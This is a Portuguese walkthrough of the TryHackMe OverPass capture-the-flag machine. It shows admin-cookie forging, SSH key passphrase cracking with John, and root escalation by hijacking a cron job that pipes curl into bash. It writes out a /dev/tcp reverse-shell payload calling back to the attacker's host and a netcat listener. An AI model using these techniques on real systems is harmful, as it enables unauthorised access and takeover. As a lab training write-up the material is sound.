---
title: "Try Hack Me - OverPass"
published: 2025-09-06
description: "Walkthrough detalhado da máquina OverPass do TryHackMe, explorando uma chave SSH com senha fraca e escalando privilégios via Crontab Hijacking."
image: "https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/05/overpass2.png?fit=1024%2C409&ssl=1"
tags: ["tryhackme", "ctf", "walkthrough", "nmap", "gobuster", "ssh", "john", "privesc", "cron"]
category: "TryHackMe"
draft: false
---

# Try Hack Me - OverPass

:::note
**Resumo da Máquina**
- **IP:** `10.201.11.108`
- **SO:** Ubuntu Linux
- **Vetor de Ataque:** Chave SSH privada exposta e protegida por senha fraca, escalação de privilégios via sequestro de tarefa Cron (Crontab Hijacking).
:::

**Tags:** `#ctf` `#walkthrough` `#nmap` `#gobuster` `#ssh` `#john` `#privesc` `#cron`

---

## 1. Reconhecimento e Enumeração

O primeiro passo foi escanear a máquina alvo para identificar portas abertas e os serviços em execução.

### 1.1. Varredura com Nmap
Usei o Nmap com os scripts `-sV` (versão dos serviços) e `-sC` (scripts padrão) para uma enumeração inicial.

```bash
nmap -sV -sC 10.201.11.108
```

**Resultado:**
```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 11:27 -03
Nmap scan report for 10.201.11.108
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

:::tip
**Pontos de Interesse Encontrados:**
- **Porta 22:** SSH (`OpenSSH 7.6p1`)
- **Porta 80:** HTTP (`Golang net/http server`)
:::

### 1.2. Enumeração de Diretórios Web
Com um servidor web ativo na porta 80, o próximo passo foi procurar por diretórios e arquivos ocultos usando o **GoBuster**.

```bash
gobuster dir -u http://10.201.11.108/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
```

**Resultado:**
```text
===============================================================
Gobuster v3.8
===============================================================
[+] Url:                     http://10.201.11.108/
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Extensions:              php,txt
===============================================================
/img              (Status: 301) [Size: 0] [--> img/]
/downloads        (Status: 301) [Size: 0] [--> downloads/]
/aboutus          (Status: 301) [Size: 0] [--> aboutus/]
/admin            (Status: 301) [Size: 42] [--> /admin/]
/css              (Status: 301) [Size: 0] [--> css/]
===============================================================
```

O diretório `/admin/` foi o achado mais promissor para a próxima fase de investigação.

---

## 2. Acesso Inicial (SSH)

Ao acessar o diretório `/admin/`, a página estava restrita. Manipulando os cookies no console do navegador, foi possível obter acesso.

```javascript
Cookies.set("SessionToken","123");
```

Após definir o cookie e atualizar a página, uma chave SSH privada criptografada para um usuário chamado `James` foi revelada.

### 2.1. Quebrando a Senha da Chave SSH
A chave estava protegida por uma senha (passphrase). Para quebrá-la, utilizei o **John the Ripper**.

1. **Salvar a chave** em um arquivo chamado `id_rsa` e ajustar suas permissões.
   ```bash
   chmod 600 id_rsa
   ```
2. **Extrair o hash** da chave usando o script `ssh2john.py`.
   ```bash
   python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
   ```
3. **Quebrar o hash** com o `john` e a wordlist `rockyou.txt`.
   ```bash
   john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
   ```
   **Resultado:**
   ```text
   Using default input encoding: UTF-8
   Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
   ...
   james13          (id_rsa)     
   ...
   Session completed.
   ```

:::important
A senha da chave SSH foi descoberta: `james13`
:::

### 2.2. Obtendo Acesso
Com a chave privada (`id_rsa`) e a senha (`james13`), realizei o login via SSH.

```bash
ssh -i id_rsa james@10.201.11.108
```

Após inserir a senha `james13`, o acesso ao shell como usuário `james` foi concedido.

### 2.3. Capturando a Flag do Usuário
Com o acesso inicial, procurei pela flag `user.txt`.

```bash
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
```

:::important
**user.txt:** `thm{...user_flag...}`
:::

---

## 3. Escalação de Privilégios

Para obter acesso `root`, foi necessário encontrar um vetor de escalação de privilégios no sistema. A enumeração foi feita com o script `lse.sh`.

### 3.1. Identificando o Vetor (Cron Job)
A análise do `lse.sh` e a verificação manual do arquivo `/etc/crontab` revelaram uma tarefa agendada (cron job) vulnerável, executada a cada minuto como `root`.

```bash
james@overpass-prod:~$ cat /etc/crontab
...
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

A tarefa baixa e executa um script de `overpass.thm`. A estratégia é sequestrar essa requisição, fazendo com que o domínio `overpass.thm` aponte para a nossa máquina de ataque.

### 3.2. Exploração (Crontab Hijacking)
1. **Modificar o /etc/hosts na máquina alvo:**
   Adicionei uma entrada para que overpass.thm resolvesse para o IP da minha máquina (10.9.1.139).
   ```bash
   # Na máquina alvo (james@overpass-prod)
   echo "10.9.1.139 overpass.thm" >> /etc/hosts
   ```
2. **Preparar o payload na máquina do atacante:**
   Criei a estrutura de diretórios esperada e um buildscript.sh com um payload de reverse shell.
   ```bash
   echo "bash -i >& /dev/tcp/10.9.1.139/4444 0>&1" > buildscript.sh
   ```
3. **Servir o payload e iniciar o listener:**
   Iniciei um servidor web simples para hospedar o script e um listener com netcat para receber a conexão.
   ```bash
   # Na máquina do atacante (no diretório ~/)
   python3 -m http.server 80

   # Em outro terminal
   nc -lvnp 4444
   ```
4. **Receber o shell root:**
   Quando o cron job executou (dentro de um minuto), ele baixou e executou nosso script malicioso, resultando em um shell reverso como root.
   ```bash
   listening on [any] 4444 ...
   connect to [10.9.1.139] from (UNKNOWN) [10.201.11.108] 58676
   bash: cannot set terminal process group (20057): Inappropriate ioctl for device
   bash: no job control in this shell
   root@overpass-prod:~#
   ```

### 3.3. Capturando a Flag Root
Agora como `root`, bastou ler a flag final.

```bash
root@overpass-prod:~# cat /root/root.txt
```

:::important
**root.txt:** `thm{..root_flag...}`
:::
